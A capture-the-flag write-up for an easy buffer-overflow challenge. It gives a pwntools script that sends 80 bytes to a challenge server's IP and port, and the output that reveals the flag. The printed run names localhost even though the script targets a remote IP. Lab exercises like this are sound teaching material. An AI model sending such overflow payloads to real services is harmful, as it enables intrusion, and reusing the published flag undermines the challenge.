# SenpaiOverflow - Buffer Overflow Challenge

## Challenge Description

**Category**: Pwn
**Difficulty**: Easy

This challenge presents a program called "SenpaiOverflow" with an anime-themed scenario. The goal is to make the senpai notice you by exploiting a vulnerability in the code to reveal the flag.

## Challenge Analysis

This challenge is a similar copy of the TitanBreacher challenge, just with an anime theme. Both challenges use the same vulnerability concept and exploit method.

When running the binary locally, we can see the program's behavior:

```
┌──(kali㉿kali)-[~/Desktop/citeflag/pwn/Senpaioverfllow]
└─$ ls
senpai
                                                                                                                                          
┌──(kali㉿kali)-[~/Desktop/citeflag/pwn/Senpaioverfllow]
└─$ chmod +x senpai 
                                                                                                                                          
┌──(kali㉿kali)-[~/Desktop/citeflag/pwn/Senpaioverfllow]
└─$ ./senpai        
╭─────────────────────────────────────────╮
│       Welcome to Anime Academy!         │
│ Tell senpai why you deserve attention!  │
╰─────────────────────────────────────────╯
Your message to senpai: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
You wrote: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Ohh? What's this? Your message was so long...
Error: Could not open flag.txt!
```

The vulnerability is clear - the program has a buffer overflow vulnerability where a long input causes the program to enter a conditional block that prints the flag. When providing a long string of characters, we can see it's looking for a flag.txt file that doesn't exist on our local system.

## Exploitation

Just like in the TitanBreacher challenge, we need to create an input longer than 70 characters to trigger the condition that reveals the flag.

## Solution

The solution as implemented in the Python script works by connecting to the remote server and sending a long string of characters:

```python
#!/usr/bin/env python3
from pwn import *

# Set up pwntools
context.log_level = 'info'

# Connect to challenge
try:
    conn = remote('139.59.162.57', 7162)
    
    # Create payload - send 80 characters to ensure we exceed the threshold
    payload = b'A' * 80
    
    # Send payload when prompted
    conn.recvuntil(b"Your message to senpai: ")
    conn.sendline(payload)
    
    # Receive response
    conn.interactive()
except Exception as e:
    error(f"Error occurred: {str(e)}")
```

When run against the remote server, we get the flag:

```
(env) root@server:~/challenges-final/SenpaiOverflow# python solve.py 
[+] Opening connection to localhost on port 7162: Done
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
You wrote: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Ohh? What's this? Your message was so long...

╭─────────────────────────────────────────╮
│           SENPAI NOTICED YOU!!          │
╰─────────────────────────────────────────╯
Here's your flag: CMC{s3np41_n0t1c3d_y0u_uwu} 
[*] Got EOF while
```

## Note

"I didn't want to complicate pwn, I don't know much about it so I made 2 easy challenges that are the same and 1 different slightly difficult."

## Conclusion

This challenge demonstrates a basic buffer overflow vulnerability, similar to the TitanBreacher challenge but with an anime theme. Both challenges serve as good introductions to the world of binary exploitation, focusing on the most fundamental concepts without requiring advanced knowledge of memory corruption techniques. 